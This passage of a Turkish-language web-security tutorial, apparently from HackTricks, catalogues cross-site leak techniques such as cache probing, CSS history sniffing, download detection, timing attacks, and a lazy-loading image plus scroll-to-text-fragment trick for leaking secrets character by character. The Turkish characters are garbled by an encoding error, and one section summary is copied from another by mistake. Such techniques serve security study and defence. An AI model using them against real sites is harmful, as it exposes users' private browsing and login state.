Bu tekniÄŸin bir Ã¶rneÄŸi, Chrome'da bir **PDF**'nin **Ã§erÃ§eve sayÄ±mÄ±** ile **tespit edilebilmesidir** Ã§Ã¼nkÃ¼ dahili olarak bir `embed` kullanÄ±lÄ±r. `zoom`, `view`, `page`, `toolbar` gibi iÃ§eriÄŸi kontrol etmeye olanak tanÄ±yan [AÃ§Ä±k URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) vardÄ±r; bu teknik ilginÃ§ olabilir.

### HTMLElements

* **Inclusion Methods**: HTML ElemanlarÄ±
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Ä°ki olasÄ± durumu ayÄ±rt etmek iÃ§in sÄ±zdÄ±rÄ±lan deÄŸeri okuyun.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elemanlarÄ± aracÄ±lÄ±ÄŸÄ±yla bilgi sÄ±zdÄ±rÄ±lmasÄ±, Ã¶zellikle dinamik medya dosyalarÄ± kullanÄ±cÄ± bilgilerine dayalÄ± olarak oluÅŸturulduÄŸunda veya filigranlar eklendiÄŸinde, medya boyutunu deÄŸiÅŸtirdiÄŸinde web gÃ¼venliÄŸi aÃ§Ä±sÄ±ndan bir endiÅŸe kaynaÄŸÄ±dÄ±r. Bu, belirli HTML elemanlarÄ± tarafÄ±ndan aÃ§Ä±ÄŸa Ã§Ä±kan bilgileri analiz ederek olasÄ± durumlarÄ± ayÄ±rt etmek iÃ§in saldÄ±rganlar tarafÄ±ndan istismar edilebilir.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: Bu eleman, medyanÄ±n `duration` ve `buffered` sÃ¼relerini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r; bunlara API'si aracÄ±lÄ±ÄŸÄ±yla eriÅŸilebilir. [HTMLMediaElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: `videoHeight` ve `videoWidth` deÄŸerlerini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. BazÄ± tarayÄ±cÄ±larda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek Ã¶zellikler mevcuttur; bu da medya iÃ§eriÄŸi hakkÄ±nda daha derinlemesine bilgi sunar. [HTMLVideoElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Bu fonksiyon, video oynatma kalitesi hakkÄ±nda bilgiler saÄŸlar; `totalVideoFrames` dahil, bu da iÅŸlenen video verisinin miktarÄ±nÄ± gÃ¶sterebilir. [getVideoPlaybackQuality() hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Bu eleman, bir resmin `height` ve `width` deÄŸerlerini sÄ±zdÄ±rÄ±r. Ancak, bir resim geÃ§ersizse, bu Ã¶zellikler 0 dÃ¶ner ve `image.decode()` fonksiyonu reddedilir; bu da resmin dÃ¼zgÃ¼n bir ÅŸekilde yÃ¼klenmediÄŸini gÃ¶sterir. [HTMLImageElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML ElemanlarÄ±
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** KullanÄ±cÄ±nÄ±n durumu veya durumu ile iliÅŸkili web sitesi stilindeki deÄŸiÅŸiklikleri belirleyin.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamalarÄ±, kullanÄ±cÄ±nÄ±n durumuna baÄŸlÄ± olarak web sitesi stilini deÄŸiÅŸtirebilir. SaldÄ±rgan sayfasÄ±nda **HTML baÄŸlantÄ± elemanÄ±** ile Ã§apraz kÃ¶kenli CSS dosyalarÄ± gÃ¶mÃ¼lebilir ve **kurallar** saldÄ±rgan sayfasÄ±na **uygulanÄ±r**. EÄŸer bir sayfa bu kurallarÄ± dinamik olarak deÄŸiÅŸtirirse, bir saldÄ±rgan kullanÄ±cÄ± durumuna baÄŸlÄ± olarak bu **farklÄ±lÄ±klarÄ±** **tespit** edebilir.\
Bir sÄ±zdÄ±rma tekniÄŸi olarak, saldÄ±rgan belirli bir HTML elemanÄ±nÄ±n CSS Ã¶zelliklerini **okumak iÃ§in** `window.getComputedStyle` yÃ¶ntemini kullanabilir. SonuÃ§ olarak, etkilenen eleman ve Ã¶zellik adÄ± biliniyorsa, saldÄ±rgan keyfi CSS Ã¶zelliklerini okuyabilir.

### CSS History

* **Inclusion Methods**: HTML ElemanlarÄ±
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** Bir URL'ye `:visited` stilinin uygulanÄ±p uygulanmadÄ±ÄŸÄ±nÄ± tespit edin; bu, daha Ã¶nce ziyaret edildiÄŸini gÃ¶sterir.
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**Bu**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) kaynaÄŸa gÃ¶re, bu yÃ¶ntem baÅŸsÄ±z Chrome'da Ã§alÄ±ÅŸmamaktadÄ±r.
{% endhint %}

CSS `:visited` seÃ§ici, daha Ã¶nce kullanÄ±cÄ± tarafÄ±ndan ziyaret edilmiÅŸ URL'leri farklÄ± ÅŸekilde stilize etmek iÃ§in kullanÄ±lÄ±r. GeÃ§miÅŸte, bu stil farklÄ±lÄ±klarÄ±nÄ± belirlemek iÃ§in `getComputedStyle()` yÃ¶ntemi kullanÄ±labiliyordu. Ancak, modern tarayÄ±cÄ±lar bu yÃ¶ntemin bir baÄŸlantÄ±nÄ±n durumunu aÃ§Ä±ÄŸa Ã§Ä±karmasÄ±nÄ± Ã¶nlemek iÃ§in gÃ¼venlik Ã¶nlemleri uygulamÄ±ÅŸtÄ±r. Bu Ã¶nlemler, baÄŸlantÄ±nÄ±n ziyaret edilmiÅŸ gibi her zaman hesaplanan stilin dÃ¶ndÃ¼rÃ¼lmesini ve `:visited` seÃ§ici ile uygulanabilecek stillerin kÄ±sÄ±tlanmasÄ±nÄ± iÃ§erir.

Bu kÄ±sÄ±tlamalara raÄŸmen, bir baÄŸlantÄ±nÄ±n ziyaret edilmiÅŸ durumunu dolaylÄ± olarak ayÄ±rt etmek mÃ¼mkÃ¼ndÃ¼r. Bir teknik, kullanÄ±cÄ±yÄ± CSS'den etkilenen bir alanla etkileÅŸime girmeye ikna etmeyi iÃ§erir; Ã¶zellikle `mix-blend-mode` Ã¶zelliÄŸini kullanarak. Bu Ã¶zellik, Ã¶ÄŸelerin arka planlarÄ±yla karÄ±ÅŸmasÄ±nÄ± saÄŸlar ve kullanÄ±cÄ± etkileÅŸimine baÄŸlÄ± olarak ziyaret edilmiÅŸ durumu aÃ§Ä±ÄŸa Ã§Ä±karabilir.

AyrÄ±ca, kullanÄ±cÄ± etkileÅŸimi olmadan baÄŸlantÄ±larÄ±n render sÃ¼relerini istismar ederek tespit saÄŸlanabilir. TarayÄ±cÄ±lar, ziyaret edilmiÅŸ ve ziyaret edilmemiÅŸ baÄŸlantÄ±larÄ± farklÄ± ÅŸekilde render edebileceÄŸinden, bu render sÃ¼resinde Ã¶lÃ§Ã¼lebilir bir zaman farkÄ± oluÅŸturabilir. Bir kanÄ±t konsepti (PoC), bu tekniÄŸi zaman farkÄ±nÄ± artÄ±rmak iÃ§in birden fazla baÄŸlantÄ± kullanarak gÃ¶steren bir Chromium hata raporunda belirtilmiÅŸtir; bÃ¶ylece ziyaret edilmiÅŸ durum zaman analizi ile tespit edilebilir hale gelir.

Bu Ã¶zellikler ve yÃ¶ntemler hakkÄ±nda daha fazla bilgi iÃ§in belgelerine gÃ¶z atÄ±n:

* `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: BaÅŸlÄ±klar
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** Google Chrome'da, bir sayfa X-Frame-Options kÄ±sÄ±tlamalarÄ± nedeniyle Ã§apraz kÃ¶kenli bir sitede gÃ¶mÃ¼lmesi engellendiÄŸinde Ã¶zel bir hata sayfasÄ± gÃ¶rÃ¼ntÃ¼lenir.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` baÅŸlÄ±ÄŸÄ± "deny" veya "same-origin" olarak ayarlanmÄ±ÅŸ bir sayfa bir nesne olarak gÃ¶mÃ¼ldÃ¼ÄŸÃ¼nde, bir hata sayfasÄ± gÃ¶rÃ¼nÃ¼r. Chrome, bu nesnenin `contentDocument` Ã¶zelliÄŸi iÃ§in boÅŸ bir belge nesnesi (null yerine) dÃ¶ndÃ¼rÃ¼r; bu, iframe'lerde veya diÄŸer tarayÄ±cÄ±larda olduÄŸu gibi deÄŸildir. SaldÄ±rganlar, boÅŸ belgeyi tespit ederek bunu istismar edebilir ve kullanÄ±cÄ±nÄ±n durumu hakkÄ±nda bilgi aÃ§Ä±ÄŸa Ã§Ä±karabilir; Ã¶zellikle geliÅŸtiriciler X-Frame-Options baÅŸlÄ±ÄŸÄ±nÄ± tutarsÄ±z bir ÅŸekilde ayarladÄ±klarÄ±nda, genellikle hata sayfalarÄ±nÄ± gÃ¶z ardÄ± ederler. GÃ¼venlik baÅŸlÄ±klarÄ±nÄ±n farkÄ±nda olmak ve tutarlÄ± bir ÅŸekilde uygulanmasÄ±, bu tÃ¼r sÄ±zÄ±ntÄ±larÄ± Ã¶nlemek iÃ§in kritik Ã¶neme sahiptir.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: BaÅŸlÄ±klar
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** Bir saldÄ±rgan, iframe'leri kullanarak dosya indirmelerini ayÄ±rt edebilir; iframe'in sÃ¼rekli eriÅŸilebilirliÄŸi, dosya indirmenin baÅŸarÄ±lÄ± olduÄŸunu gÃ¶sterir.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` baÅŸlÄ±ÄŸÄ±, Ã¶zellikle `Content-Disposition: attachment`, tarayÄ±cÄ±ya iÃ§eriÄŸi gÃ¶rÃ¼ntÃ¼lemek yerine indirmesi talimatÄ±nÄ± verir. Bu davranÄ±ÅŸ, kullanÄ±cÄ±nÄ±n bir dosya indirmesini tetikleyen bir sayfaya eriÅŸip eriÅŸmediÄŸini tespit etmek iÃ§in istismar edilebilir. Chromium tabanlÄ± tarayÄ±cÄ±larda, bu indirme davranÄ±ÅŸÄ±nÄ± tespit etmek iÃ§in birkaÃ§ teknik vardÄ±r:

1. **Ä°ndirme Ã‡ubuÄŸu Ä°zleme**:
* Chromium tabanlÄ± tarayÄ±cÄ±larda bir dosya indirildiÄŸinde, tarayÄ±cÄ± penceresinin alt kÄ±smÄ±nda bir indirme Ã§ubuÄŸu gÃ¶rÃ¼nÃ¼r.
* Pencere yÃ¼ksekliÄŸindeki deÄŸiÅŸiklikleri izleyerek, saldÄ±rgan indirme Ã§ubuÄŸunun gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ Ã§Ä±karabilir; bu, bir indirmenin baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterir.
2. **Iframe ile Ä°ndirme Navigasyonu**:
* Bir sayfa `Content-Disposition: attachment` baÅŸlÄ±ÄŸÄ±nÄ± kullanarak bir dosya indirmesini tetiklediÄŸinde, bu bir navigasyon olayÄ± oluÅŸturmaz.
* Ä°Ã§eriÄŸi bir iframe'de yÃ¼kleyerek ve navigasyon olaylarÄ±nÄ± izleyerek, iÃ§erik durumunun bir dosya indirmesine neden olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r (navigasyon yok) veya olmadÄ±ÄŸÄ±nÄ± kontrol edebilirsiniz.
3. **Iframe Olmadan Ä°ndirme Navigasyonu**:
* Iframe tekniÄŸine benzer ÅŸekilde, bu yÃ¶ntem bir iframe yerine `window.open` kullanmayÄ± iÃ§erir.
* Yeni aÃ§Ä±lan penceredeki navigasyon olaylarÄ±nÄ± izlemek, bir dosya indirmenin tetiklenip tetiklenmediÄŸini (navigasyon yok) veya iÃ§eriÄŸin satÄ±r iÃ§i olarak gÃ¶rÃ¼ntÃ¼lenip gÃ¶rÃ¼ntÃ¼lenmediÄŸini (navigasyon gerÃ§ekleÅŸir) ortaya Ã§Ä±karabilir.

Sadece giriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±larÄ±n bu tÃ¼r indirmeleri tetikleyebildiÄŸi senaryolarda, bu teknikler kullanÄ±cÄ±nÄ±n kimlik doÄŸrulama durumunu dolaylÄ± olarak Ã§Ä±karÄ±m yapmak iÃ§in kullanÄ±labilir.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Zamanlama
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** Bir saldÄ±rgan, iframe'leri kullanarak dosya indirmelerini ayÄ±rt edebilir; iframe'in sÃ¼rekli eriÅŸilebilirliÄŸi, dosya indirmenin baÅŸarÄ±lÄ± olduÄŸunu gÃ¶sterir.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) ( [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) kaynaÄŸÄ±ndan)

{% hint style="warning" %}
Bu tekniÄŸin ilginÃ§ olmasÄ±nÄ±n nedeni: Chrome artÄ±k **Ã¶nbellek bÃ¶lÃ¼mlendirmesi** yapÄ±yor ve yeni aÃ§Ä±lan sayfanÄ±n Ã¶nbellek anahtarÄ±: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`; ancak bir ngrok sayfasÄ± aÃ§Ä±p iÃ§inde fetch kullanÄ±rsam, Ã¶nbellek anahtarÄ±: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)` olacaktÄ±r; **Ã¶nbellek anahtarÄ± farklÄ±dÄ±r**, bu nedenle Ã¶nbellek paylaÅŸÄ±lmaz. Daha fazla ayrÄ±ntÄ±yÄ± burada bulabilirsiniz: [Ã–nbelleÄŸi bÃ¶lÃ¼mlendirerek gÃ¼venlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
([**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) gelen yorum)
{% endhint %}

EÄŸer bir site `example.com`, `*.example.com/resource` adresinden bir kaynak iÃ§eriyorsa, o kaynak, kaynaÄŸÄ±n doÄŸrudan **Ã¼st dÃ¼zey navigasyon** ile **istek yapÄ±lmasÄ±** durumunda **aynÄ± Ã¶nbellek anahtarÄ±na** sahip olacaktÄ±r. Bunun nedeni, Ã¶nbellek anahtarÄ±nÄ±n Ã¼st dÃ¼zey _eTLD+1_ ve Ã§erÃ§eve _eTLD+1_'den oluÅŸmasÄ±dÄ±r.

Ã–nbelleÄŸe eriÅŸim, bir kaynaÄŸÄ± yÃ¼klemekten daha hÄ±zlÄ± olduÄŸundan, bir sayfanÄ±n konumunu deÄŸiÅŸtirmeyi ve durdurduktan sonra 20ms (Ã¶rneÄŸin) sonra iptal etmeyi denemek mÃ¼mkÃ¼ndÃ¼r. EÄŸer durdurduktan sonra kÃ¶ken deÄŸiÅŸtiyse, bu, kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ± anlamÄ±na gelir.\
Ya da sadece **Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ sayfaya bazÄ± fetch istekleri gÃ¶nderip geÃ§en sÃ¼reyi Ã¶lÃ§ebilirsiniz**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: YÃ¶nlendirmeler
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Bir fetch isteÄŸine verilen yanÄ±tÄ±n bir yÃ¶nlendirme olup olmadÄ±ÄŸÄ±nÄ± bulmak mÃ¼mkÃ¼ndÃ¼r.
* **Code Example**:

![](<../.gitbook/assets/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Zamanlama
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Bir kaynaÄŸÄ± yÃ¼klemeye Ã§alÄ±ÅŸmak ve yÃ¼klenmeden Ã¶nce yÃ¼klemeyi kesmek mÃ¼mkÃ¼ndÃ¼r. Bir hata tetiklenip tetiklenmediÄŸine baÄŸlÄ± olarak, kaynak Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ ya da alÄ±nmamÄ±ÅŸtÄ±r.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

_**fetch**_ ve _**setTimeout**_ kullanarak bir **AbortController** ile hem **kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ±** tespit etmek hem de belirli bir kaynaÄŸÄ± tarayÄ±cÄ± Ã¶nbelleÄŸinden Ã§Ä±karmak mÃ¼mkÃ¼ndÃ¼r. AyrÄ±ca, bu iÅŸlem yeni iÃ§erik Ã¶nbelleÄŸe almadan gerÃ§ekleÅŸir.

### Script Pollution

* **Inclusion Methods**: HTML ElemanlarÄ± (script)
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** YerleÅŸik fonksiyonlarÄ± **aÅŸÄ±rÄ± yazmak** ve bunlarÄ±n argÃ¼manlarÄ±nÄ± okumak mÃ¼mkÃ¼ndÃ¼r; bu, **Ã§apraz kÃ¶kenli script**'ten bile (doÄŸrudan okunamaz) deÄŸerli bilgileri **sÄ±zdÄ±rabilir**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Service worker kullanarak bir webin yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§Ã¼n.
* **Code Example**:

Verilen senaryoda, saldÄ±rgan, kendi alanlarÄ±ndan biri olan "attacker.com" iÃ§inde bir **service worker** kaydetme giriÅŸiminde bulunur. ArdÄ±ndan, saldÄ±rgan ana belgeden hedef web sitesinde yeni bir pencere aÃ§ar ve **service worker**'a bir zamanlayÄ±cÄ± baÅŸlatmasÄ±nÄ± talimatÄ±nÄ± verir. Yeni pencere yÃ¼klenmeye baÅŸladÄ±ÄŸÄ±nda, saldÄ±rgan Ã¶nceki adÄ±mda elde edilen referansÄ± **service worker** tarafÄ±ndan yÃ¶netilen bir sayfaya yÃ¶nlendirir.

Ã–nceki adÄ±mda baÅŸlatÄ±lan isteÄŸin varÄ±ÅŸÄ±nda, **service worker** **204 (No Content)** durum kodu ile yanÄ±t verir ve navigasyon sÃ¼recini etkili bir ÅŸekilde sonlandÄ±rÄ±r. Bu noktada, **service worker** daha Ã¶nce baÅŸlatÄ±lan zamanlayÄ±cÄ±dan bir Ã¶lÃ§Ã¼m alÄ±r. Bu Ã¶lÃ§Ã¼m, JavaScript'in navigasyon sÃ¼recinde gecikmelere neden olan sÃ¼resinden etkilenir.

{% hint style="warning" %}
YÃ¼rÃ¼tme zamanlamasÄ±nda, **daha hassas Ã¶lÃ§Ã¼mler** elde etmek iÃ§in **aÄŸ faktÃ¶rlerini** **ortadan kaldÄ±rmak** mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfa yÃ¼klenmeden Ã¶nce sayfanÄ±n kullandÄ±ÄŸÄ± kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Bir isteÄŸi gerÃ§ekleÅŸtirmek iÃ§in geÃ§en sÃ¼reyi Ã¶lÃ§mek iÃ§in [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanÄ±n. DiÄŸer saatler de kullanÄ±labilir.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** `window.open` kullanarak bir isteÄŸi gerÃ§ekleÅŸtirmek iÃ§in geÃ§en sÃ¼reyi Ã¶lÃ§mek iÃ§in [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanÄ±n. DiÄŸer saatler de kullanÄ±labilir.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturun ve **otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Re Injection ile

Burada, **HTML iÃ§eriÄŸi enjekte ederek** Ã§apraz kÃ¶kenli bir HTML'den bilgi sÄ±zdÄ±rma tekniklerini bulabilirsiniz. Bu teknikler, herhangi bir nedenle **HTML enjekte edebiliyorsanÄ±z ancak JS kodu enjekte edemiyorsanÄ±z** ilginÃ§tir.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

EÄŸer **iÃ§erik sÄ±zdÄ±rmanÄ±z** gerekiyorsa ve **gizli olanÄ±n Ã¶ncesine HTML ekleyebiliyorsanÄ±z**, **yaygÄ±n dangling markup tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenle **karakter karakter** yapmanÄ±z **GEREKÄ°YORSA** (belki iletiÅŸim bir Ã¶nbellek vuruÅŸu ile) bu hileyi kullanabilirsiniz.

HTML'deki **resimlerin** bir "**loading**" Ã¶zelliÄŸi vardÄ±r ve bu Ã¶zelliÄŸin deÄŸeri "**lazy**" olabilir. Bu durumda, resim gÃ¶rÃ¼ntÃ¼lendiÄŸinde yÃ¼klenecek ve sayfa yÃ¼klenirken deÄŸil:
```html
<img src=/something loading=lazy >
```
Bu nedenle, yapabileceÄŸiniz ÅŸey **birÃ§ok gereksiz karakter eklemek** (Ã¶rneÄŸin **binlerce "W"**) ve **gizli bilgiden Ã¶nce web sayfasÄ±nÄ± doldurmak veya** `<br><canvas height="1850px"></canvas><br>` gibi bir ÅŸey eklemektir.\
Sonra, Ã¶rneÄŸin **enjeksiyonumuz bayraktan Ã¶nce gÃ¶rÃ¼nÃ¼yorsa**, **gÃ¶rÃ¼ntÃ¼** **yÃ¼klenir**, ancak **bayraktan sonra** gÃ¶rÃ¼nÃ¼yorsa, bayrak + gereksiz karakter **yÃ¼klenmesini engelleyecektir** (ne kadar gereksiz karakter ekleyeceÄŸinizle oynamanÄ±z gerekecek). Bu, [**bu yazÄ±da**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) olan ÅŸeydir.

BaÅŸka bir seÃ§enek, **scroll-to-text-fragment** kullanmak olabilir, eÄŸer izin verilirse:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya eriÅŸmesini** saÄŸlarsÄ±nÄ±z, bir ÅŸeyle gibi
```
#:~:text=SECR
```
Web sayfasÄ± ÅŸÃ¶yle bir ÅŸey olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html, saldÄ±rganÄ±n gereksiz karakterlerini ve tembel yÃ¼kleme gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ iÃ§erir ve ardÄ±ndan botun sÄ±rrÄ± eklenir.

Bu metin, botun sayfadaki `SECR` metnini iÃ§eren herhangi bir metne eriÅŸmesini saÄŸlayacaktÄ±r. Bu metin sÄ±rdÄ±r ve **gÃ¶rÃ¼ntÃ¼nÃ¼n hemen altÄ±nda** yer almaktadÄ±r, **gÃ¶rÃ¼ntÃ¼ yalnÄ±zca tahmin edilen sÄ±r doÄŸruysa yÃ¼klenir**. BÃ¶ylece, **sÄ±rrÄ± karakter karakter dÄ±ÅŸarÄ± sÄ±zdÄ±rmak iÃ§in oracliniz var**.

Bunu istismar etmek iÃ§in bazÄ± kod Ã¶rnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### GÃ¶rÃ¼ntÃ¼ Tembel YÃ¼kleme ZamanÄ±na DayalÄ±

EÄŸer **harici bir gÃ¶rÃ¼ntÃ¼yÃ¼ yÃ¼klemek mÃ¼mkÃ¼n deÄŸilse**, bu, saldÄ±rgana gÃ¶rÃ¼ntÃ¼nÃ¼n yÃ¼klendiÄŸini gÃ¶sterebilir, baÅŸka bir seÃ§enek ise **karakteri birkaÃ§ kez tahmin etmeye Ã§alÄ±ÅŸmak ve bunu Ã¶lÃ§mektir**. EÄŸer gÃ¶rÃ¼ntÃ¼ yÃ¼klenirse, tÃ¼m istekler gÃ¶rÃ¼ntÃ¼ yÃ¼klenmediÄŸinde olduÄŸundan daha uzun sÃ¼recektir. Bu, [**bu yazÄ±nÄ±n Ã§Ã¶zÃ¼mÃ¼nde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **Ã¶zetlenen** ÅŸeydir:

